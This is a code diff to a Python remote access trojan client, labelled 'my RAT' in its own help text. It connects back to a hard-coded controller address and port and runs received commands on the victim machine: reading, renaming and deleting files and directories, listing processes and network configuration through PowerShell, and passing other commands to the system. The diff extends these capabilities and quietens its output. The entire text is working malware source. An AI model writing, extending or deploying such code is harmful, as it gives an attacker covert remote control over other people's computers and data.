@@ -3,6 +3,7 @@ import socket
 import subprocess
 import os
 import re
+import colorama
 
 
 class ClientClass:
@@ -10,7 +11,7 @@ class ClientClass:
     def __init__(self, ip, port):
         self.ip = ip
         self.port = port
-        self.curdir = os.getcwd()
+        self.cur_dir = os.getcwd()
         self.BUFFER_SIZE = 1024 * 128
         self.SEPARATOR = "\n\n"
 
@@ -19,85 +20,89 @@ class ClientClass:
             global client
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client.connect((self.ip, self.port))
-            firstmassage = f'\n{self.curdir}>> '
-            client.send(firstmassage.encode())
+            first_massage = f'\n{self.cur_dir}>> '
+            client.send(first_massage.encode())
         except Exception as error:
             print(error)
 
-    def encryptfile(self):
-        pass
-
-    def cexe(self):
+    def c_exe(self):
         while True:
             # receive the commands
             command = client.recv(self.BUFFER_SIZE).decode()
-            splited_command = command.split()
+            split_command = command.split()
 
-            if splited_command[0].lower() == "exit":
+            if split_command[0].lower() == "exit":
                 client.close()
 
-            elif splited_command[0].lower() == "man" or splited_command[0].lower() == "--help":
-                output = """
+            elif split_command[0].lower() == "man" or split_command[0].lower() == "--help":
+                output = f"""
                 man page for my RAT:
+                {colorama.Fore.LIGHTRED_EX}
                 exit - Exit Shell
                 cd - Change Directory
+                rn - Rename File/Directory
+                rm - Remove File
+                mkdir - Make Directory
+                rmdir - Remove Directory
                 ls - List Directory
                 pwd - Working Directory
                 cat - Show file content
+                proclist - PowerShell Get-Process output 
+                {colorama.Fore.WHITE}
                 """
-            elif splited_command[0].lower() == "cd":
+            elif split_command[0].lower() == "cd":
                 # cd command, change directory
                 try:
-                    os.chdir(' '.join(splited_command[1:]))
+                    os.chdir(' '.join(split_command[1:]))
                 except Exception as error:
                     # if there is an error, set as the output
                     output = str(error)
                 else:
                     # if operation is successful, empty message
                     output = ""
-            elif splited_command[0].lower() == "rn":
+            elif split_command[0].lower() == "rn":
 
-                tgt_file = ''.join(splited_command[1])
-                new_name = ''.join(splited_command[2])
+                tgt_file = ''.join(split_command[1])
+                new_name = ''.join(split_command[2])
 
                 try:
                     os.rename(tgt_file, new_name)
                 except Exception as error:
                     output = str(error)
                 else:
-                    output = "File got renamed"
+                    output = ""
 
-            elif splited_command[0].lower() == "ls" and not splited_command[1:]:
+            elif split_command[0].lower() == "ls" and not split_command[1:]:
                 execute = os.listdir()
                 string = ' '.join(execute)
                 reg = re.sub("\s", "\n", string)
                 output = reg
 
-            elif splited_command[0].lower() == "pwd" and not splited_command[1:]:
+            elif split_command[0].lower() == "pwd" and not split_command[1:]:
                 output = os.getcwd()
 
-            elif splited_command[0].lower() == "rm":
+            elif split_command[0].lower() == "rm":
                 try:
-                    os.remove(''.join(splited_command[1:]))
+                    os.remove(''.join(split_command[1:]))
                 except Exception as error:
                     output = str(error)
                 else:
-                    output = f'{splited_command[1:]} got removed'
+                    output = ''
 
-            elif splited_command[0].lower() == "mkdir":
-                os.mkdir(''.join(splited_command[1:]))
-                output = f"New Directory {splited_command[1:]} created"
+            elif split_command[0].lower() == "mkdir":
+                os.mkdir(''.join(split_command[1:]))
+                output = ""
 
-            elif splited_command[0].lower() == "rmdir":
+            elif split_command[0].lower() == "rmdir":
                 try:
-                    os.rmdir(''.join(splited_command[1:]))
+                    os.rmdir(''.join(split_command[1:]))
                 except Exception as error:
                     output = str(error)
                 else:
-                    output = f'Directory {splited_command[1:]} Got Deleted'
+                    output = ''
 
-            elif splited_command[0].lower() == "cat":
-                y = ' '.join(splited_command[1:])
+            elif split_command[0].lower() == "cat":
+                y = ' '.join(split_command[1:])
                 try:
                     with open(y) as f:
                         x = f.readlines()
@@ -107,26 +112,33 @@ class ClientClass:
                 except Exception as error:
                     output = str(error)
 
-            elif splited_command[0].lower() == "proclist":
-                if not splited_command[1:]:
+            elif split_command[0].lower() == "proclist":
+                if not split_command[1:]:
                     output = subprocess.check_output(['powershell.exe',
                                                       'Get-Process'],
                                                      encoding='utf-8')
 
-                elif splited_command[1] == "-pid":
+                elif split_command[1] == "-pid":
                     output = subprocess.check_output(['powershell.exe',
                                                       'Get-Process',
                                                       '-PID',
-                                                      ''.join(splited_command[2:])],
+                                                      ''.join(split_command[2:])],
                                                      encoding='utf-8')
 
                 else:
                     output = "Hint: proclist -pid <process id> "
-
-            elif splited_command[0].lower() == "shell":
-                a = "Starting Interactive CMD Shell, Enter 'end' to Break out."
-                client.send(a.encode())
-                output = subprocess.getoutput(command)
+            elif split_command[0].lower() == "ip":
+                if not split_command[1:]:
+                    output = subprocess.check_output(['powershell.exe',
+                                                      'ipconfig'],
+                                                     encoding='utf-8')
+                elif split_command[1] == "a":
+                    output = subprocess.check_output(['powershell.exe',
+                                                      'ipconfig',
+                                                      '/all'],
+                                                     encoding='utf-8')
+                else:
+                    output = "Hint: ip/ip a"
 
             else:
                 # execute the command and retrieve the results
@@ -147,4 +159,4 @@ rat = ClientClass('10.211.55.7', 5555)
 
 if __name__ == '__main__':
     rat.connection()
-    rat.cexe()
+    rat.c_exe()
